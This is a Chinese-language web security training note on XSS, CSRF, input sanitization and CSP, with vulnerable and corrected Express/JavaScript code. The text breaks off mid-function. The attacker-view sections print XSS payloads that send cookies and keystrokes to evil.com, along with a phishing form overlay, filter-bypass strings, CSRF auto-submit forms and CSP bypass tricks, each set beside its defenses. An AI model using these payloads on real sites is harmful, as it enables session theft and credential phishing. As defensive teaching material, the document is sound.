# Web 安全专项训练 — XSS / CSRF / 输入净化 / CSP

> 专项训练 13:00 | 2026-05-03
> 覆盖: XSS 攻防 / CSRF 攻防 / 输入净化 / 内容安全策略 / 安全代码模式

---

## 一、XSS (跨站脚本攻击)

### 1.1 三种 XSS 类型

| 类型 | 触发点 | 存储位置 | 危害范围 |
|------|--------|----------|----------|
| Reflected (反射型) | URL 参数 | 无 | 单次点击 |
| Stored (存储型) | 数据库内容 | 服务端 | 所有访问者 |
| DOM-based (DOM 型) | 前端 JS 操作 | 无 | 本地 DOM |

### 1.2 攻击示例与防御

#### 1.2.1 Reflected XSS — URL 参数注入

```html
<!-- ❌ 漏洞: 直接渲染 URL 参数 -->
<script>
  const name = new URLSearchParams(location.search).get('name');
  document.getElementById('greeting').innerHTML = 'Hello, ' + name;
</script>

<!-- 攻击 URL -->
https://example.com/page?name=<img src=x onerror=alert(1)>
```

```javascript
// ✅ 防御 1: 使用 textContent (自动转义)
const name = new URLSearchParams(location.search).get('name');
document.getElementById('greeting').textContent = 'Hello, ' + (name || '');

// ✅ 防御 2: 使用 DOMPurify 净化 HTML
import DOMPurify from 'dompurify';
const name = new URLSearchParams(location.search).get('name');
document.getElementById('greeting').innerHTML = DOMPurify.sanitize('Hello, ' + name);

// ✅ 防御 3: 服务端转义 (Node.js)
const escapeHtml = (str) => str
  .replace(/&/g, '&amp;')
  .replace(/</g, '&lt;')
  .replace(/>/g, '&gt;')
  .replace(/"/g, '&quot;')
  .replace(/'/g, '&#x27;')
  .replace(/\//g, '&#x2F;');
```

#### 1.2.2 Stored XSS — 评论区注入

```javascript
// ❌ 漏洞: 服务端直接存储和返回用户输入
app.post('/comment', (req, res) => {
  const { content } = req.body;
  db.run('INSERT INTO comments (content) VALUES (?)', [content]);
  // 前端直接 innerHTML 渲染 → XSS
});

// ✅ 防御: 服务端净化 + 前端转义
const sanitizeInput = (str) => {
  // 1. 移除危险标签
  // 2. 转义特殊字符
  return escapeHtml(str.trim());
};

app.post('/comment', (req, res) => {
  const { content } = req.body;
  const safe = sanitizeInput(content);
  db.run('INSERT INTO comments (content) VALUES (?)', [safe]);
});

// 前端渲染
// ✅ Vue: 默认转义 {{ comment }}
// ✅ React: 默认转义 {comment.content}
// ✅ 原生: element.textContent = comment.content
```

#### 1.2.3 DOM-based XSS — location 操作

```javascript
// ❌ 漏洞: 直接操作 DOM 使用 location.hash
const hash = location.hash.slice(1);
document.getElementById('content').innerHTML = decodeURIComponent(hash);

// ❌ 漏洞: eval location 数据
eval('var data = ' + location.search.slice(1));

// ❌ 漏洞: 动态创建 script
const script = document.createElement('script');
script.src = location.hash.slice(1); // #https://evil.com/steal.js
document.head.appendChild(script);

// ✅ 防御: 永远不要信任 location 数据
const hash = location.hash.slice(1);
document.getElementById('content').textContent = decodeURIComponent(hash);
```

### 1.3 现代框架的 XSS 防护

```javascript
// React — JSX 自动转义
// ✅ 安全: 自动转义
const Comment = ({ text }) => <div>{text}</div>;

// ❌ 危险: dangerouslySetInnerHTML
const Comment = ({ html }) => (
  <div dangerouslySetInnerHTML={{ __html: html }} />
);
// 必须先用 DOMPurify 净化:
// <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />

// Vue — 模板自动转义
// ✅ 安全: 自动转义
// <div>{{ comment }}</div>

// ❌ 危险: v-html
// <div v-html="comment"></div>
// 必须先用 DOMPurify 净化

// Angular — 默认转义
// ✅ 安全: 自动转义
// <div>{{ comment }}</div>

// ❌ 危险: innerHTML 绑定
// <div [innerHTML]="comment"></div>
// Angular 的 DomSanitizer 自动净化，但 bypassSecurityTrustHtml 会绕过
```

### 1.4 攻防演练: XSS 攻击链

```javascript
// ========== 攻击者视角 ==========

// 攻击 1: 窃取 Cookie
// 注入: <script>fetch('https://evil.com/steal?c='+document.cookie)</script>

// 攻击 2: 键盘记录器
// 注入: <script>
//   document.onkeypress = e =>
//     fetch('https://evil.com/keylog', {
//       method: 'POST',
//       body: JSON.stringify({ key: e.key })
//     })
// </script>

// 攻击 3: 钓鱼表单覆盖
// 注入: <div style="position:fixed;top:0;left:0;width:100%;height:100%;
//   background:white;z-index:9999">
//   <form action="https://evil.com/steal" method="POST">
//     <input name="user"><input type="password" name="pass">
//     <button type="submit">重新登录</button>
//   </form>
// </div>

// 攻击 4: 绕过简单过滤 (大小写/编码)
// <ScRiPt>alert(1)</ScRiPt>
// <img src="x" onerror="&#97;&#108;&#101;&#114;&#116;(1)">
// <svg onload="alert(1)">
// <body onload="alert(1)">
// <iframe src="javascript:alert(1)">

// ========== 防御者视角 ==========

// 纵深防御策略:
// 1. 输入净化 (sanitize on input)
// 2. 输出转义 (escape on output)
// 3. CSP 策略 (Content-Security-Policy)
// 4. HttpOnly Cookie (防 JS 读取)
// 5. 框架默认转义 (React/Vue/Angular)

// 完整净化函数
const sanitizeForHTML = (input) => {
  // 1. 类型检查
  if (typeof input !== 'string') return '';
  // 2. 长度限制
  if (input.length > 10000) input = input.slice(0, 10000);
  // 3. HTML 实体转义
  return input
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/\//g, '&#x2F;');
};

const sanitizeForAttribute = (input) => {
  if (typeof input !== 'string') return '';
  // 属性值中只允许安全字符
  return input.replace(/[^a-zA-Z0-9\-_.]/g, '');
};

const sanitizeForURL = (input) => {
  if (typeof input !== 'string') return '';
  // 禁止 javascript: 和 data: 协议
  const trimmed = input.trim().toLowerCase();
  if (trimmed.startsWith('javascript:') || trimmed.startsWith('data:')) {
    return '#';
  }
  return input;
};
```

---

## 二、CSRF (跨站请求伪造)

### 2.1 攻击原理

```
用户登录了 bank.com (有 session cookie)
用户访问了 evil.com
evil.com 包含:
  <form action="https://bank.com/transfer" method="POST">
    <input name="to" value="attacker">
    <input name="amount" value="10000">
  </form>
  <script>document.forms[0].submit()</script>

→ 浏览器自动携带 bank.com 的 cookie
→ bank.com 以为是用户本人操作
→ 转账成功
```

### 2.2 防御方案

#### 2.2.1 SameSite Cookie (现代浏览器首选)

```javascript
// ✅ 服务端设置 SameSite Cookie
res.cookie('session', token, {
  httpOnly: true,    // 防 XSS 读取
  secure: true,      // 仅 HTTPS
  sameSite: 'strict' // 或 'lax'
});

// SameSite 值:
// 'strict' — 跨站请求完全不发送 cookie (最安全，可能影响用户体验)
// 'lax'    — GET 导航请求发送，POST 不发送 (默认推荐)
// 'none'   — 始终发送 (需配合 Secure)
```

#### 2.2.2 CSRF Token

```javascript
// ========== 服务端 ==========
const crypto = require('crypto');
const csrfTokens = new Map();

// 生成 token
app.get('/api/csrf-token', (req, res) => {
  const token = crypto.randomBytes(32).toString('hex');
  csrfTokens.set(req.sessionID, token);
  res.json({ csrfToken: token });
});

// 验证 token
const verifyCSRF = (req, res, next) => {
  const token = req.headers['x-csrf-token'] || req.body._csrf;
  const expected = csrfTokens.get(req.sessionID);
  if (!token || token !== expected) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }
  next();
};

app.post('/api/transfer', verifyCSRF, (req, res) => {
  // 转账逻辑
});

// ========== 前端 ==========
class CSRFProtectedClient {
  constructor(baseUrl) {
    this.baseUrl = baseUrl;
    this.token = null;
  }

  async init() {
    const res = await fetch(`${this.baseUrl}/api/csrf-token`);
    const data = await res.json();
    this.token = data.csrfToken;
  }

  async request(method, path, body) {
    if (!this.token) await this.init();
    const res = await fetch(`${this.baseUrl}${path}`, {
      method,
      credentials: 'include',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': this.token,
      },
      body: body ? JSON.stringify(body) : undefined,
    });
    // 403 说明 token 过期，重新获取后重试
    if (res.status === 403) {
      await this.init();
      return this.request(method, path, body);
    }
    return res;
  }
}
```

#### 2.2.3 Origin / Referer 验证

```javascript
// ========== 服务端中间件 ==========
const verifyOrigin = (req, res, next) => {
  const origin = req.headers.origin;
  const referer = req.headers.referer;
  const allowedOrigins = ['https://myapp.com', 'https://www.myapp.com'];

  // 优先检查 Origin (所有跨域请求都有)
  if (origin && !allowedOrigins.includes(origin)) {
    return res.status(403).json({ error: 'Invalid origin' });
  }

  // 回退检查 Referer (同域请求可能没有 Origin)
  if (!origin && referer) {
    const refererOrigin = new URL(referer).origin;
    if (!allowedOrigins.includes(refererOrigin)) {
      return res.status(403).json({ error: 'Invalid referer' });
    }
  }

  next();
};

// 对非安全方法应用
app.use((req, res, next) => {
  if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(req.method)) {
    return verifyOrigin(req, res, next);
  }
  next();
});
```

#### 2.2.4 双重 Cookie 验证 (Double Submit Cookie)

```javascript
// ========== 原理 ==========
// 1. 服务端在 cookie 中设置 csrf_token
// 2. 前端读取 cookie，在请求体/header 中发送相同值
// 3. 服务端比较 cookie 值和 body/header 值是否一致
// 4. 攻击者无法读取 cookie (跨域)，所以无法构造一致的值

// ========== 服务端 ==========
const doubleSubmitVerify = (req, res, next) => {
  const cookieToken = req.cookies.csrf_token;
  const bodyToken = req.body._csrf || req.headers['x-csrf-token'];

  if (!cookieToken || !bodyToken || cookieToken !== bodyToken) {
    return res.status(403).json({ error: 'CSRF verification failed' });
  }
  next();
};

// 设置 cookie
app.get('/api/csrf-token', (req, res) => {
  const token = crypto.randomBytes(32).toString('hex');
  res.cookie('csrf_token', token, {
    httpOnly: false, // 必须可读！前端需要读取
    secure: true,
    sameSite: 'lax',
  });
  res.json({ csrfToken: token });
});

// ========== 前端 ==========
const getCSRFToken = () => {
  return document.cookie
    .split('; ')
    .find(row => row.startsWith('csrf_token='))
    ?.split('=')[1];
};

const fetchWithCSRF = async (url, options = {}) => {
  const token = getCSRFToken();
  return fetch(url, {
    ...options,
    credentials: 'include',
    headers: {
      ...options.headers,
      'X-CSRF-Token': token,
    },
  });
};
```

### 2.3 攻防演练: CSRF 攻击场景

```javascript
// ========== 攻击场景 ==========

// 场景 1: 恶意图片触发 GET 请求
// <img src="https://bank.com/transfer?to=attacker&amount=10000">
// → 防御: 敏感操作只用 POST/PUT/DELETE

// 场景 2: 自动提交表单
// <form action="https://bank.com/transfer" method="POST" id="f">
//   <input name="to" value="attacker">
//   <input name="amount" value="10000">
// </form>
// <script>document.getElementById('f').submit()</script>
// → 防御: CSRF Token / SameSite

// 场景 3: Fetch 跨域请求
// fetch('https://bank.com/transfer', {
//   method: 'POST',
//   credentials: 'include',
//   body: 'to=attacker&amount=10000'
// });
// → 防御: SameSite Cookie + CSRF Token
// → 注意: 简单请求 (Content-Type: application/x-www-form-urlencoded) 不会触发 CORS preflight

// 场景 4: JSON 请求绕过 (Content-Type 差异)
// fetch('https://bank.com/api/transfer', {
//   method: 'POST',
//   credentials: 'include',
//   headers: { 'Content-Type': 'application/json' },
//   body: JSON.stringify({ to: 'attacker', amount: 10000 })
// });
// → 防御: 这会触发 CORS preflight，但 SameSite 仍然有效
// → 额外防御: 要求 Content-Type: application/json 的请求必须有 CSRF Token

// ========== 防御清单 ==========
const csrfDefenseChecklist = [
  '✅ SameSite=Strict 或 Lax (浏览器级防御)',
  '✅ CSRF Token 验证 (服务端验证)',
  '✅ Origin/Referer 头检查 (辅助防御)',
  '✅ 敏感操作使用 POST/PUT/DELETE (不用 GET)',
  '✅ 关键操作要求二次验证 (密码/2FA)',
  '✅ HttpOnly Cookie (防 XSS 窃取 session)',
  '✅ Content-Type 检查 (拒绝非预期类型)',
];
```

---

## 三、输入净化 (Input Sanitization)

### 3.1 净化策略矩阵

```javascript
// ========== 净化策略选择 ==========

// 1. 白名单净化 (推荐) — 只允许已知安全的输入
const whitelistSanitize = {
  // 用户名: 字母数字 + 下划线
  username: (input) => String(input).replace(/[^a-zA-Z0-9_]/g, ''),

  // 邮箱: 标准格式
  email: (input) => {
    const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    const cleaned = String(input).trim().toLowerCase();
    return emailRegex.test(cleaned) ? cleaned : null;
  },

  // 年龄: 正整数
  age: (input) => {
    const num = parseInt(input, 10);
    return Number.isInteger(num) && num >= 0 && num <= 150 ? num : null;
  },

  // URL: 只允许 http/https
  url: (input) => {
    try {
      const url = new URL(input);
      if (url.protocol === 'http:' || url.protocol === 'https:') {
        return url.href;
      }
      return null;
    } catch {
      return null;
    }
  },

  // 颜色: hex 颜色码
  color: (input) => {
    const hexRegex = /^#([0-9a-fA-F]{3}|[0-9a-fA-F]{6})$/;
    return hexRegex.test(String(input)) ? String(input) : null;
  },
};

// 2. 黑名单净化 (不推荐，容易绕过)
const blacklistSanitize = {
  // ❌ 容易被绕过: 编码/大小写/新标签
  removeScripts: (input) => String(input)
    .replace(/<script[^>]*>.*?<\/script>/gi, '')
    .replace(/on\w+\s*=/gi, ''),
};

// 3. 结构化净化 (最佳实践)
const schemaValidator = {
  // 使用 schema 定义 + 类型转换 + 范围检查
  validateUserInput: (raw) => {
    const errors = [];
    const result = {};

    // name: 字符串, 2-50 字符
    if (typeof raw.name !== 'string') {
      errors.push('name must be a string');
    } else if (raw.name.length < 2 || raw.name.length > 50) {
      errors.push('name must be 2-50 characters');
    } else {
      result.name = raw.name.trim();
    }

    // email: 字符串, 邮箱格式
    if (typeof raw.email !== 'string') {
      errors.push('email must be a string');
    } else {
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      if (!emailRegex.test(raw.email)) {
        errors.push('invalid email format');
      } else {
        result.email = raw.email.trim().toLowerCase();
      }
    }

    // age: 数字, 0-150
    const age = Number(raw.age);
    if (!Number.isInteger(age) || age < 0 || age > 150) {
      errors.push('age must be integer 0-150');
    } else {
      result.age = age;
    }

    // role: 枚举
    const allowedRoles = ['user', 'moderator', 'admin'];
    if (!allowedRoles.includes(raw.role)) {
      errors.push('invalid role');
    } else {
      result.role = raw.role;
    }

    return {
      valid: errors.length === 0,
      errors,
      data: result,
    };
  },
};
```

### 3.2 上下文感知的净化

```javascript
// ========== 关键原则: 净化取决于输出上下文 ==========

const contextAwareSanitize = {
  // HTML 上下文: 转义 HTML 实体
  htmlContext: (input) => {
    const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#x27;', '/': '&#x2F;' };
    return String(input).replace(/[&<>"'/]/g, c => map[c]);
  },

  // 属性上下文: 转义 + 限制字符
  attributeContext: (input) => {
    return String(input)
      .replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#x27;' }[c]))
      .replace(/`/g, '&#96;'); // 防止模板注入
  },

  // JavaScript 上下文: 转义 JS 字符串
  jsContext: (input) => {
    return JSON.stringify(String(input)).slice(1, -1); // 去掉外层引号
  },

  // CSS 上下文: 限制字符
  cssContext: (input) => {
    return String(input).replace(/[^a-zA-Z0-9\-_]/g, '');
  },

  // URL 上下文: 协议检查 + 编码
  urlContext: (input) => {
    try {
      const url = new URL(input);
      if (url.protocol === 'http:' || url.protocol === 'https:') {
        return url.href;
      }
      return '#'; // 安全回退
    } catch {
      return '#';
    }
  },

  // SQL 上下文: 参数化查询 (永远不要拼接 SQL!)
  sqlContext: (input) => {
    // ❌ 错误: 字符串拼接
    // `SELECT * FROM users WHERE name = '${input}'`

    // ✅ 正确: 参数化查询
    // db.query('SELECT * FROM users WHERE name = ?', [input])
    return input; // 参数化查询不需要净化，驱动会处理
  },
};
```

### 3.3 富文本净化 (允许部分 HTML)

```javascript
// ========== 使用 DOMPurify 净化富文本 ==========

// 基础净化
const purifyHTML = (html) => {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'li', 'ol', 'h1', 'h2', 'h3'],
    ALLOWED_ATTR: ['href', 'title', 'rel'],
    ALLOWED_URI_REGEXP: /^(https?|mailto):\/\//i, // 只允许 http/https/mailto
    FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed', 'form'],
    FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover'],
  });
};

// 允许图片 (需额外配置)
const purifyHTMLWithImages = (html) => {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'img', 'ul', 'li', 'ol'],
    ALLOWED_ATTR: ['href', 'title', 'rel', 'src', 'alt', 'width', 'height'],
    ALLOWED_URI_REGEXP: /^(https?|mailto):\/\//i,
    ADD_ATTR: ['target'],
    ADD_TAGS: ['span'],
  });
};

// Markdown 渲染 (先转 HTML 再净化)
const renderMarkdown = (markdown) => {
  // 1. Markdown → HTML (marked / showdown / remark)
  const html = marked.parse(markdown);
  // 2. HTML 净化
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'code', 'pre', 'a', 'ul', 'ol', 'li', 'h1', 'h2', 'h3', 'blockquote'],
    ALLOWED_ATTR: ['href', 'title'],
    ALLOWED_URI_REGEXP: /^(https?|mailto):\/\//i,
  });
};
```

### 3.4 输入净化中间件 (Express)

```javascript
// ========== Express 输入净化中间件 ==========

const { body, query, param, validationResult } = require('express-validator');

const validateAndSanitize = [
  // 用户名
  body('username')
    .isString()
    .trim()
    .isLength({ min: 3, max: 30 })
    .matches(/^[a-zA-Z0-9_]+$/)
    .withMessage('Username: 3-30 chars, alphanumeric and underscore only'),

  // 邮箱
  body('email')
    .isEmail()
    .normalizeEmail()
    .withMessage('Valid email required'),

  // 年龄
  body('age')
    .optional()
    .isInt({ min: 0, max: 150 })
    .toInt(),

  // 简介 (允许有限 HTML)
  body('bio')
    .optional()
    .isString()
    .trim()
    .isLength({ max: 500 })
    .customSanitizer(value => {
      return DOMPurify.sanitize(value, {
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'br'],
        ALLOWED_ATTR: [],
      });
    }),

  // 处理验证结果
  (req, res, next) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }
    next();
  },
];

app.post('/api/users', validateAndSanitize, (req, res) => {
  const { username, email, age, bio } = req.body;
  // 此时数据已净化，安全使用
  res.json({ message: 'User created', user: { username, email, age, bio } });
});
```

---

## 四、内容安全策略 (CSP)

### 4.1 CSP 基础

```
# CSP 是什么?
# 告诉浏览器: 只允许加载来自指定来源的资源
# 通过 HTTP 头或 <meta> 标签设置

# HTTP 头方式 (推荐)
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; style-src 'self' 'unsafe-inline'

# <meta> 标签方式
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
```

### 4.2 CSP 指令详解

```javascript
// ========== CSP 策略配置 ==========

const cspPolicies = {
  // 1. 严格策略 (最安全)
  strict: `
    default-src 'self';
    script-src 'self';
    style-src 'self';
    img-src 'self' data:;
    font-src 'self';
    connect-src 'self';
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';
  `,

  // 2. 宽松策略 (允许 CDN)
  withCDN: `
    default-src 'self';
    script-src 'self' https://cdn.jsdelivr.net https://unpkg.com;
    style-src 'self' https://cdn.jsdelivr.net 'unsafe-inline';
    img-src 'self' data: https:;
    font-src 'self' https://fonts.gstatic.com;
    connect-src 'self' https://api.example.com;
    frame-ancestors 'self';
    base-uri 'self';
    form-action 'self';
  `,

  // 3. 开发策略 (允许热更新)
  development: `
    default-src 'self';
    script-src 'self' 'unsafe-eval' 'unsafe-inline' http://localhost:35729;
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: blob:;
    connect-src 'self' ws://localhost:35729 http://localhost:3000;
  `,

  // 4. SPA 策略 (React/Vue 应用)
  spa: `
    default-src 'self';
    script-src 'self';
    style-src 'self' 'unsafe-inline';  // 内联样式 (CSS-in-JS)
    img-src 'self' data: blob:;        // data URI + blob URL
    font-src 'self';
    connect-src 'self' https://api.example.com;
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';
  `,

  // 5. 报告模式 (不阻止，只报告)
  reportOnly: `
    default-src 'self';
    script-src 'self';
    report-uri /csp-report;
  `,
};

// ========== CSP 指令参考 ==========
/*
  default-src     — 默认策略 (所有类型兜底)
  script-src      — JavaScript 来源
  style-src       — CSS 来源
  img-src         — 图片来源
  font-src        — 字体来源
  connect-src     — XHR/Fetch/WebSocket 来源
  media-src       — 音视频来源
  object-src      — <object>/<embed>/<applet>
  frame-src       — <iframe> 来源 (已废弃，用 frame-ancestors)
  frame-ancestors — 允许嵌入本页面的来源 (防 clickjacking)
  base-uri        — <base> 标签来源
  form-action     — <form> 提交目标
  worker-src      — Web Worker / Service Worker
  manifest-src    — manifest.json 来源

  来源值:
  'self'          — 同源
  'unsafe-inline' — 允许内联 (script/style)
  'unsafe-eval'   — 允许 eval() 等
  'none'          — 不允许任何来源
  'nonce-<base64>' — 一次性随机数
  'sha256-<hash>'  — 内容哈希
  https://cdn.example.com — 指定域名
  https:           — 所有 HTTPS 来源
  data:            — data: URI
  blob:            — blob: URL
*/
```

### 4.3 CSP Nonce (动态内联脚本)

```javascript
// ========== 服务端生成 Nonce ==========
const crypto = require('crypto');

app.use((req, res, next) => {
  // 为每个请求生成唯一 nonce
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.cspNonce = nonce;

  // 设置 CSP 头
  res.setHeader('Content-Security-Policy',
    `default-src 'self'; script-src 'self' 'nonce-${nonce}'`
  );
  next();
});

// ========== 模板中使用 Nonce ==========
// EJS 模板:
// <script nonce="<%= cspNonce %>">
//   // 安全的内联脚本
//   const config = { apiUrl: '/api' };
// </script>

// ========== CSP Hash (静态内联脚本) ==========
// 对于不变的脚本，可以用 hash:
// script-src 'sha256-abc123...'
//
// 计算 hash:
// echo -n "console.log('hello')" | openssl dgst -sha256 -binary | base64
// → sha256-X4QkM... (具体值)
```

### 4.4 CSP 实施策略

```javascript
// ========== CSP 中间件 (Helmet) ==========
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "https://cdn.jsdelivr.net"],
    styleSrc: ["'self'", "'unsafe-inline'"], // CSS-in-JS 需要
    imgSrc: ["'self'", "data:", "https:"],
    fontSrc: ["'self'", "https://fonts.gstatic.com"],
    connectSrc: ["'self'", "https://api.example.com"],
    frameAncestors: ["'none'"],
    baseUri: ["'self'"],
    formAction: ["'self'"],
    // 报告端点
    reportUri: ["/csp-report"],
    // 报告模式 (不阻止，只记录)
    // reportTo: ["csp-endpoint"],
  },
}));

// ========== CSP 报告端点 ==========
app.post('/csp-report', (req, res) => {
  const report = req.body['csp-report'] || req.body;
  console.error('CSP Violation:', {
    violatedDirective: report.violatedDirective,
    blockedURI: report.blockedURI,
    lineNumber: report.lineNumber,
    columnNumber: report.columnNumber,
    sourceFile: report.sourceFile,
    userAgent: req.headers['user-agent'],
    timestamp: new Date().toISOString(),
  });
  res.status(204).end();
});

// ========== CSP 渐进式部署 ==========
// 1. 先用 report-only 模式收集违规
// 2. 分析报告，修复问题
// 3. 逐步收紧策略
// 4. 最后启用 enforce 模式

// report-only 头 (不阻止，只报告)
// Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```

### 4.5 攻防演练: CSP 绕过与反绕过

```javascript
// ========== 攻击者视角: CSP 绕过尝试 ==========

// 绕过 1: 利用允许的外部脚本
// CSP: script-src 'self' https://cdn.example.com
// 攻击: 如果 cdn.example.com 有 XSS 漏洞 → 攻击者注入恶意脚本
// → 防御: 只信任高度安全的 CDN + SRI (Subresource Integrity)

// 绕过 2: 利用 'unsafe-inline'
// CSP: script-src 'self' 'unsafe-inline'
// 攻击: 直接注入 <script>alert(1)</script>
// → 防御: 用 nonce/hash 替代 'unsafe-inline'

// 绕过 3: 利用 data: URI
// CSP: script-src 'self' data:
// 攻击: <script src="data:text/javascript,alert(1)"></script>
// → 防御: 不要允许 data: 在 script-src 中

// 绕过 4: 利用 JSONP 端点
// CSP: script-src 'self'
// 攻击: <script src="/api/jsonp?callback=alert(1)"></script>
// → 防御: 移除 JSONP，用 CORS + fetch

// 绕过 5: 利用上传的文件
// CSP: script-src 'self'
// 攻击: 上传 .js 文件到 /uploads/evil.js，然后 <script src="/uploads/evil.js">
// → 防御: 上传目录设置 Content-Type + X-Content-Type-Options: nosniff

// ========== 防御者视角: 最佳实践 ==========
const cspBestPractices = [
  '✅ 永远不要使用 unsafe-inline (用 nonce/hash 替代)',
  '✅ 永远不要使用 unsafe-eval (避免 eval/new Function)',
  '✅ 限制 script-src 到最小必要范围',
  '✅ 设置 frame-ancestors: none (防 clickjacking)',
  '✅ 设置 base-uri: self (防 <base> 注入)',
  '✅ 设置 form-action: self (防表单劫持)',
  '✅ 使用 report-uri 监控违规',
  '✅ 渐进式部署 (report-only → enforce)',
  '✅ 定期审查 CSP 策略',
  '✅ 配合 SRI 使用外部脚本',
];
```

---

## 五、综合安全代码示例

### 5.1 安全 Express 应用模板

```javascript
// ========== 安全 Express 应用完整配置 ==========
const express = require('express');
const helmet = require('helmet');
const crypto = require('crypto');
const cookieParser = require('cookie-parser');

const app = express();

// 1. 安全头部 (Helmet)
app.use(helmet());
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", "data:"],
    connectSrc: ["'self'"],
    frameAncestors: ["'none'"],
    baseUri: ["'self'"],
    formAction: ["'self'"],
  },
}));
app.use(helmet.crossOriginEmbedderPolicy());
app.use(helmet.crossOriginOpenerPolicy());
app.use(helmet.crossOriginResourcePolicy({ policy: "same-origin" }));
app.use(helmet.dnsPrefetchControl({ allow: false }));
app.use(helmet.frameguard({ action: 'deny' }));
app.use(helmet.hidePoweredBy());
app.use(helmet.hsts({ maxAge: 31536000, includeSubDomains: true }));
app.use(helmet.ieNoOpen());
app.use(helmet.noSniff());
app.use(helmet.originAgentCluster());
app.use(helmet.permittedCrossDomainPolicies());
app.use(helmet.referrerPolicy({ policy: 'strict-origin-when-cross-origin' }));
app.use(helmet.xssFilter());

// 2. 速率限制
const rateLimit = require('express-rate-limit');
app.use(rateLimit({
  windowMs: 15 * 60 * 1000, // 15 分钟
  max: 100, // 每 IP 100 次请求
  standardHeaders: true,
  legacyHeaders: false,
}));

// 3. 请求体限制
app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: false, limit: '1mb' }));

// 4. Cookie 安全
app.use(cookieParser());

// 5. CSRF 保护
const csrfTokens = new Map();
app.get('/api/csrf-token', (req, res) => {
  const token = crypto.randomBytes(32).toString('hex');
  csrfTokens.set(req.sessionID, token);
  res.json({ csrfToken: token });
});

const verifyCSRF = (req, res, next) => {
  if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(req.method)) {
    const token = req.headers['x-csrf-token'];
    const expected = csrfTokens.get(req.sessionID);
    if (!token || token !== expected) {
      return res.status(403).json({ error: 'Invalid CSRF token' });
    }
  }
  next();
};
app.use(verifyCSRF);

// 6. 输入净化中间件
const sanitizeInput = {
  string: (val, maxLen = 1000) => {
    if (typeof val !== 'string') return '';
    return val.trim().slice(0, maxLen);
  },
  html: (val) => {
    return DOMPurify ? DOMPurify.sanitize(val) : val.replace(/<[^>]*>/g, '');
  },
  url: (val) => {
    try {
      const url = new URL(val);
      if (url.protocol === 'http:' || url.protocol === 'https:') return url.href;
      return null;
    } catch { return null; }
  },
};

// 7. 安全响应头
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '0'); // 现代浏览器不需要，CSP 更好
  res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
  next();
});

// 8. 安全路由示例
app.post('/api/users', (req, res) => {
  const username = sanitizeInput.string(req.body.username, 30);
  const email = sanitizeInput.string(req.body.email, 254).toLowerCase();
  const bio = sanitizeInput.html(req.body.bio || '');

  // 验证
  if (!/^[a-zA-Z0-9_]{3,30}$/.test(username)) {
    return res.status(400).json({ error: 'Invalid username' });
  }
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    return res.status(400).json({ error: 'Invalid email' });
  }

  // 参数化查询 (防 SQL 注入)
  db.query(
    'INSERT INTO users (username, email, bio) VALUES (?, ?, ?)',
    [username, email, bio]
  );

  res.status(201).json({ message: 'User created' });
});

// 9. 安全文件上传
const multer = require('multer');
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, '/tmp/uploads'),
  filename: (req, file, cb) => {
    // 使用随机文件名，不信任原始文件名
    const ext = path.extname(file.originalname).toLowerCase();
    const allowed = ['.jpg', '.jpeg', '.png', '.gif', '.webp'];
    if (!allowed.includes(ext)) return cb(new Error('Invalid file type'));
    cb(null, `${crypto.randomBytes(16).toString('hex')}${ext}`);
  },
});
const upload = multer({
  storage,
  limits: { fileSize: 5 * 1024 * 1024 }, // 5MB
});

app.post('/api/upload', upload.single('file'), (req, res) => {
  // 上传的文件设置 Content-Type，防止执行
  res.json({ message: 'File uploaded', filename: req.file.filename });
});

// 10. 安全错误处理 (不泄露敏感信息)
app.use((err, req, res, next) => {
  console.error(err); // 服务端记录
  res.status(err.status || 500).json({
    error: process.env.NODE_ENV === 'production'
      ? 'Internal server error'
      : err.message,
  });
});
```

### 5.2 安全 Fetch 客户端

```javascript
// ========== 安全 Fetch 客户端 ==========
class SecureClient {
  constructor(baseUrl) {
    this.baseUrl = baseUrl;
    this.csrfToken = null;
  }

  async init() {
    // 获取 CSRF token
    const res = await fetch(`${this.baseUrl}/api/csrf-token`);
    const data = await res.json();
    this.csrfToken = data.csrfToken;
  }

  async request(method, path, options = {}) {
    if (!this.csrfToken) await this.init();

    const headers = {
